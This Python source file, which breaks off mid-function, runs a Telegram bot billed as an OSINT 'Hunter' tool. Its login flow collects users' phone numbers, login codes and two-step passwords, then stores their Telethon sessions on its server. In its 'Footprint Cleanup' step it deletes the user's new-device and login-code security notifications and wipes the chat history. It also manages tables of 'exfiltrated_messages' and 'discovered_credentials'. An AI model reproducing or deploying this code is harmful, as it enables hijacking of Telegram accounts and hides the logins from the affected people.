import logging
import asyncio
import os
import sys
import signal
import uuid
import redis.asyncio as redis
from telegram import Update
from telegram.error import Conflict
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ChatMemberHandler,
    filters,
    Application
)
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import shutil
from typing import Any
from telegram.helpers import escape_markdown

# Add project root to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))

from app.core.config import settings
from app.core.database import db
from app.core.constants import LOCK_TTL_SECONDS, SESSION_FILE_PERMISSIONS, WORKER_HEARTBEAT_TIMEOUT_SECONDS, TELEGRAM_SERVICE_NOTIFICATIONS_ID


# Unique ID for this process instance — used in distributed Redis locks
INSTANCE_ID = str(uuid.uuid4())

# For ConversationHandler compatibility
WAIT_PHONE, WAIT_CODE, WAIT_PASSWORD = range(3)

# Configure Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logger = logging.getLogger("bot_listener")

logger.info(f"🆔 Process Instance ID: {INSTANCE_ID}")

# Global Redis Client (initialized in main)
redis_client: redis.Redis = None
PAUSE_KEY = "system:paused"

# Admin IDs — configurable via ANONYMOUS_ADMIN_ID env var (default: Telegram anonymous group admin)
ANONYMOUS_ADMIN_ID = settings.ANONYMOUS_ADMIN_ID

# Global Stop Event
stop_event = asyncio.Event()

# ==========================================
# MULTI-BOT ROTATION STATE
# ==========================================
# Maps bot_token -> bot_username (populated at startup via getMe)
_bot_usernames: dict[str, str] = {}
# Set of bot tokens currently considered "locked" (session save failed)
_locked_bots: set[str] = set()


def _bot_id_from_token(token: str) -> str:
    """Extracts Telegram bot ID prefix from token safely."""
    try:
        return token.strip().split(":", 1)[0]
    except Exception:
        return "unknown"


def _poll_lock_key(token: str) -> str:
    """Redis key used to enforce single active poller per bot ID."""
    return f"bot_listener:poll_lock:{_bot_id_from_token(token)}"


async def _acquire_poll_lock(token: str) -> str | None:
    """Acquire distributed lock for a bot poller. Returns lock key when acquired."""
    if not redis_client:
        return None

    key = _poll_lock_key(token)
    acquired = await redis_client.set(key, INSTANCE_ID, ex=LOCK_TTL_SECONDS, nx=True)
    if acquired:
        return key

    owner = await redis_client.get(key)
    logger.warning(
        f"⚠️ Poll lock already held for bot_id={_bot_id_from_token(token)} by {owner}. "
        "Skipping this poller instance to avoid getUpdates conflicts."
    )
    return None


async def _release_poll_lock(lock_key: str | None):
    """Release lock only if still owned by this process."""
    if not lock_key or not redis_client:
        return
    try:
        owner = await redis_client.get(lock_key)
        if owner == INSTANCE_ID:
            await redis_client.delete(lock_key)
    except Exception as e:
        logger.warning(f"Failed to release poll lock {lock_key}: {e}")


async def _renew_poll_lock(lock_key: str | None):
    """Periodically refresh lock TTL while polling is active."""
    if not lock_key or not redis_client:
        return

    try:
        while not stop_event.is_set():
            await asyncio.sleep(max(15, LOCK_TTL_SECONDS // 3))
            owner = await redis_client.get(lock_key)
            if owner != INSTANCE_ID:
                logger.warning(f"Lost ownership of poll lock {lock_key}.")
                return
            await redis_client.expire(lock_key, LOCK_TTL_SECONDS)
    except asyncio.CancelledError:
        return
    except Exception as e:
        logger.warning(f"Poll lock renew failed for {lock_key}: {e}")

def _get_whitelisted_usernames():
    raw = settings.WHITELISTED_BOT_IDS or ""
    return [u.strip().lower().replace("@", "") for u in raw.split(",") if u.strip()]

def is_admin(update: Update) -> bool:
    """Checks if the user is an admin — numeric ID match ONLY.

    Telegram usernames are reassignable: an admin who changes/drops their
    username has it released back to the pool after ~30 days, and an attacker
    can register it and inherit admin rights. Numeric user_id is immutable.
    """
    user = update.effective_user

    if not user:
        return False

    # 1. Check ID (Anonymous Admin) — but ONLY when the message originated from
    # the monitor group. Otherwise any Telegram admin using "send as group" in
    # ANY chat where our bot is a member would inherit admin rights.
    if user.id == ANONYMOUS_ADMIN_ID:
        chat = update.effective_chat
        chat_id = chat.id if chat else None
        if chat_id and str(chat_id) == str(settings.MONITOR_GROUP_ID):
            logger.info(
                f"[is_admin] anonymous-admin from monitor group chat_id={chat_id} — allowed"
            )
            return True
        logger.warning(
            "[is_admin] anonymous-admin outside monitor group "
            f"(chat_id={chat_id}) — rejected"
        )
        return False

    whitelist = _get_whitelisted_usernames()
    # Only numeric entries count. Warn about any non-numeric (username) entries
    # since they're insecure and were used by the old code path.
    numeric_whitelist = {w for w in whitelist if w.isdigit()}
    non_numeric = whitelist - numeric_whitelist
    if non_numeric:
        logger.warning(
            f"[is_admin] Ignoring non-numeric WHITELISTED_BOT_IDS entries "
            f"(usernames are reassignable, insecure): {non_numeric}"
        )

    subject = _subject_label(user.id)
    logger.info(
        "🔍 Checking admin for subject=%s against %d numeric whitelist entries.",
        subject,
        len(numeric_whitelist),
    )

    # 2. Check numeric ID
    if str(user.id) in numeric_whitelist:
        logger.info("✅ subject=%s matched the numeric whitelist.", subject)
        return True

    return False

def _subject_label(user_id: object) -> str:
    try:
        from app.services.engagement import pseudonymize_engagement_subject

        return pseudonymize_engagement_subject(user_id)[:12]
    except Exception:
        return "redacted"


def _get_other_bot_usernames(current_bot_username: str) -> list[str]:
    """Returns usernames of OTHER available bots (excluding current and locked ones)."""
    other_bots = []
    for token, username in _bot_usernames.items():
        if username.lower() != current_bot_username.lower() and token not in _locked_bots:
            other_bots.append(username)
    return other_bots

def _get_all_bot_usernames_except(current_bot_username: str) -> list[str]:
    """Returns usernames of ALL other bots (even locked) for fallback messaging."""
    return [
        username for username in _bot_usernames.values()
        if username.lower() != current_bot_username.lower()
    ]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    subject = _subject_label(update.effective_user.id)
    try:
        from app.services.engagement import track_owned_bot_start

        tracking = await track_owned_bot_start(update, context)
        logger.info("📥 Received /start from subject=%s tracking=%s", subject, tracking["status"])
    except Exception as exc:
        logger.warning("[Engagement] /start tracking failed for subject=%s: %s", subject, exc)
    if not is_admin(update):
        logger.info("🚫 subject=%s is not an admin. Sending guest start.", subject)
        await update.message.reply_text(
            "👋 **Welcome to Telegram Hunter Bot**\n\n"
            "This bot is used for OSINT and account management.\n"
            "Use /starthunter in a private chat to login an account.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    logger.info("✅ subject=%s is an admin. Sending admin start.", subject)
    await update.message.reply_text("🤖 **Telegram Hunter Bot** is online.\nUse /help to see all available commands.")


async def track_private_inbound(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Record funnel progress without retaining private message content."""
    if context.user_data.get("owned_bot_first_inbound_tracked"):
        return
    try:
        from app.services.engagement import track_owned_bot_first_inbound

        await track_owned_bot_first_inbound(update, context)
        context.user_data["owned_bot_first_inbound_tracked"] = True
    except Exception as exc:
        logger.warning(
            "[Engagement] first-inbound tracking failed for subject=%s: %s",
            _subject_label(update.effective_user.id),
            exc,
        )


async def opt_out_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Honor an explicit opt-out on every monitor bot owned by this deployment."""
    try:
        from app.services.engagement import track_owned_bot_opt_out

        await track_owned_bot_opt_out(update, context)
    except Exception as exc:
        logger.warning(
            "[Engagement] opt-out tracking failed for subject=%s: %s",
            _subject_label(update.effective_user.id),
            exc,
        )
    await update.message.reply_text(
        "You are opted out. This bot will not send automated follow-ups. "
        "You can still contact an administrator directly if you need support."
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_user_admin = is_admin(update)
    
    # Show all available bots in the help text
    bot_list = ", ".join([f"@{u}" for u in _bot_usernames.values()])
    
    if is_user_admin:
        help_text = (
            "📖 **Telegram Hunter Bot Help**\n\n"
            "Here are the available commands:\n"
            "• /status - Check system health and pending broadcasts\n"
            "• /pause - Pause scanners and broadcaster\n"
            "• /resume - Resume operations\n"
            "• /restart - Restart the bot service\n"
            "• /commands - List all commands (Alias for /help)\n"
            "• /starthunter - Login a new Telegram account\n"
            "• /bots - Show all available bots\n"
            "• /telemetry - Show canonical telemetry analytics\n"
            "• /getfile <message-id> - Retrieve an archived attachment on demand\n"
            "• /backfill - Re-broadcast messages stuck in General topic\n\n"
            f"**Available Bots**: {bot_list}\n\n"
            "Only authorized administrators can use these commands."
        )
    else:
        help_text = (
            "📖 **Telegram Hunter Bot Help**\n\n"
            "Available commands:\n"
            "• /starthunter - Login a new Telegram account\n"
            "• /help - Show this help message\n\n"
            "Please use /starthunter in a private chat to begin."
        )
        
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def bots_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shows all available bots and their lock status."""
    if not is_admin(update):
        await update.message.reply_text("⚠️ This command is restricted to administrators.")
        return
    
    lines = ["🤖 **Bot Rotation Pool**\n"]
    for token, username in _bot_usernames.items():
        status = "🔒 Locked" if token in _locked_bots else "✅ Available"
        lines.append(f"• @{username} — {status}")
    
    lines.append(f"\n**Total**: {len(_bot_usernames)} bots")
    await update.message.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


INDICATOR_TYPES = ("network_domain", "canonical_url", "wallet_address")


async def _execute_db(query_builder):
    return await asyncio.to_thread(query_builder.execute)


async def _telemetry_count(indicator_type: str) -> int:
    response = await _execute_db(
        db.table("telemetry_indicators")
        .select("id", count="exact")
        .eq("indicator_type", indicator_type)
        .limit(1)
    )
    return int(response.count or 0)


async def _fetch_telemetry_summary() -> dict[str, Any]:
    counts = {
        indicator_type: await _telemetry_count(indicator_type)
        for indicator_type in INDICATOR_TYPES
    }
    recent_wallets = await _execute_db(
        db.table("telemetry_indicators")
        .select("indicator_value, first_seen_at")
        .eq("indicator_type", "wallet_address")
        .order("first_seen_at", desc=True)
        .limit(5)
    )
    recent_domains = await _execute_db(
        db.table("telemetry_indicators")
        .select("indicator_value, first_seen_at")
        .eq("indicator_type", "network_domain")
        .order("first_seen_at", desc=True)
        .limit(5)
    )
    gateway_credentials = await _execute_db(
        db.table("discovered_credentials")
        .select("id, meta")
        .eq("status", "active")
        .not_.is_("meta->gateway_telemetry->>configured_webhook_url", "null")
        .limit(5)
    )
    return {
        "counts": counts,
        "recent_wallets": recent_wallets.data or [],
        "recent_domains": recent_domains.data or [],
        "gateway_credentials": gateway_credentials.data or [],
    }


def _telemetry_value_lines(rows: list[dict[str, Any]], empty_text: str) -> list[str]:
    if not rows:
        return [escape_markdown(empty_text, version=2)]
    lines = []
    for row in rows:
        value = str(row.get("indicator_value") or "").strip()
        if value:
            lines.append(f"• `{escape_markdown(value[:96], version=2)}`")
    return lines or [escape_markdown(empty_text, version=2)]


def _format_telemetry_summary(summary: dict[str, Any]) -> str:
    counts = summary.get("counts") or {}
    gateway_lines: list[str] = []
    for row in summary.get("gateway_credentials") or []:
        meta = row.get("meta") if isinstance(row, dict) else {}
        gateway = (meta or {}).get("gateway_telemetry") if isinstance(meta, dict) else {}
        endpoint = (gateway or {}).get("configured_webhook_url") if isinstance(gateway, dict) else None
        if endpoint:
            gateway_lines.append(f"• `{escape_markdown(str(endpoint)[:96], version=2)}`")
    if not gateway_lines:
        gateway_lines.append(escape_markdown("No active webhook gateway endpoints indexed.", version=2))

    lines = [
        "*Telemetry Analytics*",
        "",
        f"*Network Domains:* `{counts.get('network_domain', 0)}`",
        f"*Canonical URLs:* `{counts.get('canonical_url', 0)}`",
        f"*Blockchain Wallets:* `{counts.get('wallet_address', 0)}`",
        "",
        "*Webhook Gateway Endpoints*",
        *gateway_lines,
        "",
        "*Recent Wallet Entities*",
        *_telemetry_value_lines(summary.get("recent_wallets") or [], "No wallet entities indexed."),
        "",
        "*Recent Network Domains*",
        *_telemetry_value_lines(summary.get("recent_domains") or [], "No network domains indexed."),
    ]
    return "\n".join(lines)


async def telemetry_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("⚠️ This command is restricted to administrators.")
        return

    try:
        summary = await _fetch_telemetry_summary()
        await update.message.reply_text(
            _format_telemetry_summary(summary),
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"Telemetry summary failed: {e}")
        await update.message.reply_text("❌ Telemetry analytics are temporarily unavailable.")


def _is_uuid(value: str) -> bool:
    try:
        uuid.UUID(value)
        return True
    except (TypeError, ValueError):
        return False


async def _fetch_attachment_message(target_id: str) -> dict[str, Any] | None:
    if _is_uuid(target_id):
        response = await _execute_db(
            db.table("exfiltrated_messages")
            .select("*")
            .eq("id", target_id)
            .limit(1)
        )
    elif target_id.isdigit():
        response = await _execute_db(
            db.table("exfiltrated_messages")
            .select("*")
            .eq("telegram_msg_id", int(target_id))
            .limit(1)
        )
    else:
        return None
    rows = response.data or []
    return rows[0] if rows else None


async def _resolve_attachment_source_chat_id(row: dict[str, Any]) -> int | str | None:
    if row.get("chat_id"):
        return row["chat_id"]

    credential_id = row.get("credential_id")
    if not credential_id:
        return None

    response = await _execute_db(
        db.table("discovered_credentials")
        .select("chat_id")
        .eq("id", credential_id)
        .limit(1)
    )
    rows = response.data or []
    if not rows:
        return None
    return rows[0].get("chat_id")


def _format_archive_result_message(result) -> str:
    if result.ok:
        return "✅ Attachment retrieval complete."
    if result.code == "too_large":
        return f"Attachment skipped: {result.detail}"
    if result.code == "timeout":
        return f"Attachment transfer timed out: {result.detail}"
    if result.code == "not_found":
        return "Attachment payload is no longer available upstream."
    if result.code == "upload_failed":
        return f"Attachment upload failed after retry: {result.detail or 'upstream transfer failed'}"
    if result.code == "session_unavailable":
        return "Attachment retrieval is temporarily unavailable because no user session is ready."
    return "Attachment payload is no longer available upstream."


async def getfile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("⚠️ This command is restricted to administrators.")
        return

    target_id = (context.args[0] if context and context.args else "").strip()
    if not target_id:
        await update.message.reply_text("Usage: /getfile <telegram_msg_id or message UUID>")
        return

    row = await _fetch_attachment_message(target_id)
    if not row:
        await update.message.reply_text("Attachment message not found.")
        return

    if row.get("media_type") in (None, "text"):
        await update.message.reply_text("That message does not contain an attachment payload.")
        return

    source_chat_id = await _resolve_attachment_source_chat_id(row)
    if not source_chat_id:
        await update.message.reply_text("Attachment source chat is unavailable for this record.")
        return

    await update.message.reply_text("⏳ Retrieving transient attachment from storage...")
    from app.services.user_agent_srv import user_agent

    result = await user_agent.archive_media_transiently(
        source_chat_id,
        int(row["telegram_msg_id"]),
        target_chat_id=update.effective_chat.id,
        caption=f"Archived Attachment [ID: {row['id']}]",
    )
    await update.message.reply_text(_format_archive_result_message(result))

async def backfill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Triggers re-broadcast of messages stuck in General topic."""
    if not is_admin(update):
        await update.message.reply_text("⚠️ This command is restricted to administrators.")
        return

    await update.message.reply_text(
        "🔄 **Backfill started**.\n"
        "Messages stuck in General will be re-queued to their correct topics.\n"
        "Check the monitor group for progress.",
        parse_mode=ParseMode.MARKDOWN
    )
    from app.workers.tasks.audit_tasks import backfill_general_messages
    backfill_general_messages.delay()

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return

    # 1. Check Redis
    redis_status = "✅ Online"
    if redis_client:
        try:
            await redis_client.ping()
        except Exception:
            redis_status = "❌ Unreachable"
    else:
        redis_status = "⚠️ Not Initialized"

    # 2. Check DB / Pending Queue
    queue_count = "?"
    try:
        res = await asyncio.to_thread(
            lambda: db.table("exfiltrated_messages").select("id", count="exact").eq("is_broadcasted", False).execute()
        )
        queue_count = res.count
    except Exception as e:
        queue_count = f"❌ Error: {str(e)[:20]}"

    # 3. Check System Pause State
    is_paused = False
    if redis_client:
        try:
            is_paused = await redis_client.get(PAUSE_KEY)
        except Exception:
            pass
            
    system_status = "⏸️ **PAUSED**" if is_paused else "▶️ **RUNNING**"
    
    # 4. Bot pool info
    bot_count = len(_bot_usernames)
    locked_count = len(_locked_bots)
    
    msg = (
        f"📊 **System Status**\n\n"
        f"**State**: {system_status}\n"
        f"**Redis**: {redis_status}\n"
        f"**Pending Broadcasts**: `{queue_count}`\n"
        f"**Bot Pool**: `{bot_count} bots ({locked_count} locked)`\n"
        f"**Monitor Group**: `{settings.MONITOR_GROUP_ID}`\n"
        f"**Environment**: `{settings.ENV}`"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return
    
    if redis_client:
        await redis_client.set(PAUSE_KEY, "true")
        await update.message.reply_text("⏸️ **System Paused**.\nScanners and Broadcaster will skip their next run.")
    else:
         await update.message.reply_text("❌ Redis not available.")

async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return

    if redis_client:
        await redis_client.delete(PAUSE_KEY)
        await update.message.reply_text("▶️ **System Resumed**.\nOperations returning to normal.")
    else:
         await update.message.reply_text("❌ Redis not available.")

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return

    await update.message.reply_text("🔄 **Restarting Bot Process**...\n(Expect a brief downtime)")
    # Signal main loop to stop gracefully
    stop_event.set()

# ==========================================
# WATCHDOG SERVICE
# ==========================================
async def watchdog_loop(bot):
    """
    Monitors System Health every 60 seconds.
    - Checks Redis connectivity.
    - Checks Worker Last Seen timestamp.
    """
    logger.info("🐶 Watchdog System Started.")
    
    # Initial State
    state = {
        "redis": True,
        "worker": True
    }
    
    while not stop_event.is_set():
        try:
            # Check Redis
            if redis_client:
                try:
                    await redis_client.ping()
                    if not state["redis"]:
                        state["redis"] = True
                        await _send_alert(bot, "✅ **RECOVERY**: Redis connection restored.")
                except Exception as e:
                    if state["redis"]:
                        state["redis"] = False
                        await _send_alert(bot, f"❌ **CRITICAL**: Redis connection LOST! ({str(e)[:20]})")
                    
                    # If Redis is down, we can't check worker stats from Redis
                    await asyncio.sleep(60)
                    continue 

                # Check Worker Heartbeat
                try:
                    last_seen = await redis_client.get("system:heartbeat:last_seen")
                    if last_seen:
                        import time
                        age = int(time.time()) - int(last_seen)
                        
                        if age > (45 * 60): # 45 minutes
                            if state["worker"]:
                                state["worker"] = False
                                await _send_alert(bot, f"⚠️ **WARNING**: Worker silent for {int(age/60)} minutes!\n(It might be stuck or crashed)")
                        else:
                            if not state["worker"]:
                                state["worker"] = True
                                await _send_alert(bot, "✅ **RECOVERY**: Worker heartbeat detected.")
                except Exception:
                    pass
            
            await asyncio.sleep(60)
        
        except asyncio.CancelledError:
            break
        except Exception as e:
             logger.error(f"Watchdog error: {e}")
             await asyncio.sleep(60)

async def _send_alert(bot, msg):
    try:
        await bot.send_message(chat_id=settings.MONITOR_GROUP_ID, text=f"🚨 [Watchdog]\n{msg}")
    except Exception as e:
        logger.error(f"Failed to send watchdog alert: {e}")

# ==========================================
# LOGIN CONVERSATION HANDLER
# ==========================================

async def schedule_deletion(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, delay: int = 30):
    """Deletes a message after a delay."""
    async def delete_task():
        await asyncio.sleep(delay)
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception as e:
            logger.error(f"Failed to delete sensitive message {message_id}: {e}")
    
    asyncio.create_task(delete_task())


async def _wipe_conversation(context: ContextTypes.DEFAULT_TYPE, chat_id: int, bot_message_ids: list):
    """
    Wipe all tracked bot messages + the user's incoming messages from this session.
    Runs silently — delete errors are suppressed (message may already be gone).
    Also attempts to delete the user's /starthunter command itself.

    Telegram only allows bots to delete their OWN messages in private chats
    unless the bot is an admin. In a DM the bot is always the sender for its
    own messages so those deletions succeed. User messages can only be deleted
    by the bot if it has delete_messages permission — in a private chat this
    is NOT granted, so user-side messages will silently fail and that is fine.
    """
    ids_to_delete = list(bot_message_ids or [])

    async def _do_wipe():
        await asyncio.sleep(1)  # tiny delay so final ACK from Telegram is processed
        for msg_id in ids_to_delete:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
            except Exception:
                pass  # already deleted or no permission — both are fine

    asyncio.create_task(_do_wipe())

async def starthunter(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Starts the login flow. Gated on ALLOW_PUBLIC_STARTHUNTER unless caller
    is a whitelisted admin. Rate-limited per user to prevent session-pool
    pollution (3 attempts per 24h)."""
    if update.effective_chat.type != "private":
        bot_username = context.bot.username or "telehunter234bot"
        await update.message.reply_text(
            "⚠️ For security, please use /starthunter in a *private chat* with me — not in a group.\n"
            f"Open a DM with @{bot_username} and run /starthunter there.",
            parse_mode=ParseMode.MARKDOWN
        )
        return ConversationHandler.END

    # Public flag OR admin gate. Non-admins in ALLOW_PUBLIC_STARTHUNTER=False
    # deployments get a polite refusal.
    if not settings.ALLOW_PUBLIC_STARTHUNTER and not is_admin(update):
        logger.warning(
            f"[starthunter] rejected non-admin user_id={update.effective_user.id} "
            f"(ALLOW_PUBLIC_STARTHUNTER=False)"
        )
        await update.message.reply_text(
            "🔒 This bot is not accepting new logins right now.",
        )
        return ConversationHandler.END

    # Per-user rate limit: 3 attempts per 24h. Redis-backed so it survives
    # bot restarts. Key format: rl:starthunter:<user_id>
    try:
        from app.core.redis_srv import redis_srv
        user_id = update.effective_user.id
        rl_key = f"rl:starthunter:{user_id}"
        attempts = redis_srv.incr_key(rl_key, ttl_seconds=86400)
        if attempts > 3:
            logger.warning(
                f"[starthunter] rate-limited user_id={user_id} attempt={attempts}/3 in 24h"
            )
            await update.message.reply_text(
                "🕒 Too many login attempts. Try again tomorrow.",
            )
            return ConversationHandler.END
    except Exception as rl_exc:
        # Redis down — don't fail closed, just log and let through
        logger.debug(f"[starthunter] rate-limit check skipped: {rl_exc}")

    msg = (
        "🚨 *BEFORE YOU PROCEED — READ THIS*\n\n"
        "This system logs you into your Telegram account and *uses your session* to:\n"
        "• Invite bots into a monitoring group so we can passively observe them\n"
        "• Send /start to bots that have never received a first message\n"
        "• Cleanup: after login, this bot's chat history with you AND the Telegram "
        "'login code' service notification are *automatically deleted* from your account\n\n"
        "*Only proceed if you understand:*\n"
        "1. Your Telethon session string is stored on our server (encrypted).\n"
        "2. Your account will be used for the actions above — this is not passive read-only.\n"
        "3. You can revoke access anytime from Telegram → Settings → Devices.\n\n"
        "If you understand and consent, reply with your phone number (+countrycode).\n"
        "Otherwise reply /cancel.\n\n"
        "_Accepted formats: +1234567890 | +1 234 567 890 | +1-234-567-890_"
    )
    sent_msg = await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

    # Track both the user's /starthunter command and our reply for full wipe
    context.user_data['bot_messages'] = [update.message.message_id, sent_msg.message_id]
    
    return WAIT_PHONE

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    
    # Track user's phone message for wipe
    context.user_data.setdefault('bot_messages', []).append(update.message.message_id)

    # Initialize a temporary client
    import tempfile
    import uuid
    temp_dir = tempfile.gettempdir()
    session_id = uuid.uuid4().hex
    temp_session_path = os.path.join(temp_dir, f"temp_login_{session_id}")
    
    # Clean up old temp file if exists (not strictly needed with uuid but good practice)
    if os.path.exists(temp_session_path + ".session"):
        try:
            os.remove(temp_session_path + ".session")
        except Exception:
            pass

    try:
        client = TelegramClient(temp_session_path, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        
        context.user_data['client'] = client
        context.user_data['phone'] = phone
        context.user_data['phone_code_hash'] = sent_code.phone_code_hash
        context.user_data['temp_session_path'] = temp_session_path
        context.user_data['login_state'] = "WAITING_FOR_CODE"

        msg = (
            "✅ Code requested!\n\n"
            "Please check your Telegram app for the login code.\n"
            "⚠️ Telegram does not allow forwarding the code to bots. Please send the code with spaces in between numbers, or dashes, or commas.\n"
            "Example: 1 2 3 4 5 instead of 12345"
        )
        sent_msg = await update.message.reply_text(msg)
        context.user_data['bot_messages'].append(sent_msg.message_id)
        
        return WAIT_CODE

    except Exception as e:
        logger.error(f"Error requesting code: {e}")
        err_msg = await update.message.reply_text(f"❌ Error requesting code: {str(e)}\nPlease try again with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err_msg.message_id)
        if 'client' in context.user_data:
            await context.user_data['client'].disconnect()
        await _wipe_conversation(context, update.effective_chat.id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    raw_code = update.message.text
    chat_id = update.effective_chat.id
    
    # Always schedule deletion of the code
    context.user_data.setdefault('bot_messages', []).append(update.message.message_id)

    # Sanitize code
    code = raw_code.replace(" ", "").replace("-", "").replace(",", "").strip()
    
    client = context.user_data.get('client')
    phone = context.user_data.get('phone')
    phone_code_hash = context.user_data.get('phone_code_hash')

    if not client or not client.is_connected():
        err = await update.message.reply_text("❌ Session expired. Please start over with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

    try:
        await client.sign_in(phone, code=code, phone_code_hash=phone_code_hash)
        # Login success!
        return await finalize_login(update, context)

    except SessionPasswordNeededError:
        msg = "🔐 Two-Step Verification is enabled.\nPlease enter your password:"
        sent_msg = await update.message.reply_text(msg)
        context.user_data['bot_messages'].append(sent_msg.message_id)
        context.user_data['login_state'] = "WAITING_FOR_2FA"
        return WAIT_PASSWORD
    except Exception as e:
        logger.error(f"Error signing in: {e}")
        err = await update.message.reply_text(f"❌ Login failed: {str(e)}\nPlease try again with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await client.disconnect()
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text
    chat_id = update.effective_chat.id
    
    # Always schedule deletion of password
    context.user_data.setdefault('bot_messages', []).append(update.message.message_id)

    client = context.user_data.get('client')
    
    if not client or not client.is_connected():
        err = await update.message.reply_text("❌ Session expired. Please start over with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

    try:
        await client.sign_in(password=password)
        return await finalize_login(update, context)
    except Exception as e:
        logger.error(f"Error with 2FA password: {e}")
        err = await update.message.reply_text(f"❌ Incorrect password or error: {str(e)}\nPlease try again with /starthunter")
        context.user_data.setdefault('bot_messages', []).append(err.message_id)
        await client.disconnect()
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))
        return ConversationHandler.END

async def finalize_login(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Finishes the login process, saves the session, and cleans up."""
    client = context.user_data.get('client')
    temp_session_path = context.user_data.get('temp_session_path')
    chat_id = update.effective_chat.id
    current_bot_username = context.bot.username or "unknown"
    
    try:
        me = await client.get_me()
        
        # Determine filename according to requirements: account_{phone}_{timestamp}.session
        import time
        phone_clean = context.user_data.get('phone', 'unknown').lstrip('+').replace(' ', '').replace('-', '')
        timestamp = int(time.time())
        filename = f"account_{phone_clean}_{timestamp}"
        
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        sessions_dir = os.path.join(base_dir, "sessions")
        os.makedirs(sessions_dir, exist_ok=True)
        # Save sessions directly to the project root as requested
        final_path = os.path.join(sessions_dir, filename + ".session")

        # ── Re-login cleanup ─────────────────────────────────────────────
        # If this phone already has session files or DB rows from a previous
        # login, remove them now. Two sessions for the same account cause
        # MTProto conflicts and long FloodWait cooldowns from Telegram.
        try:
            import glob as _glob

            # Delete any older session files matching this phone's digits
            old_pattern = os.path.join(sessions_dir, f"account_{phone_clean}_*.session")
            for old_file in _glob.glob(old_pattern):
                if os.path.abspath(old_file) == os.path.abspath(final_path):
                    continue  # never delete the file we're about to create
                try:
                    os.remove(old_file)
                    logger.info(f"[ReloginCleanup] deleted old session file: {os.path.basename(old_file)}")
                except Exception as _rm_exc:
                    logger.debug(f"[ReloginCleanup] could not remove {old_file}: {_rm_exc}")

            # Delete any DB rows whose session_path matches this phone's digits
            # but isn't the new final_path. Doing this in a threadpool so we
            # don't block the event loop.
            def _cleanup_db_rows():
                try:
                    existing = db.table("telegram_accounts").select("id, session_path").execute()
                    for r in existing.data or []:
                        p = r.get("session_path") or ""
                        # Match by "account_{phone_clean}_" substring
                        if f"/account_{phone_clean}_" in p and p != os.path.abspath(final_path):
                            db.table("telegram_accounts").delete().eq("id", r["id"]).execute()
                            logger.info(f"[ReloginCleanup] deleted DB row {r['id']} pointing to {p}")
                except Exception as _db_exc:
                    logger.debug(f"[ReloginCleanup] db row cleanup failed: {_db_exc}")

            await asyncio.to_thread(_cleanup_db_rows)
        except Exception as cleanup_exc:
            logger.warning(f"[ReloginCleanup] non-fatal: {cleanup_exc}")
        # ──────────────────────────────────────────────────────────────
        
        # Delete bot messages we sent during the flow (Footprint Cleanup)
        await _wipe_conversation(context, chat_id, context.user_data.get('bot_messages', []))

        # Use the USER account to clear history (Footprint Cleanup)
        try:
            # 1. Delete "Telegram Service Notification" (login code + new device alerts)
            async for message in client.iter_messages(TELEGRAM_SERVICE_NOTIFICATIONS_ID, limit=15):
                text = (message.message or "").lower()
                if any(kw in text for kw in ("new device", "login", "code", "verification")):
                    await message.delete()
                    logger.info(f"Deleted service notification for {filename}")

            # 2. Delete entire conversation history with the Login Bot itself
            # Use the bot's numeric ID to avoid ResolveUsernameRequest FloodWait
            bot_id = context.bot.id
            try:
                bot_entity = await client.get_input_entity(bot_id)
            except ValueError:
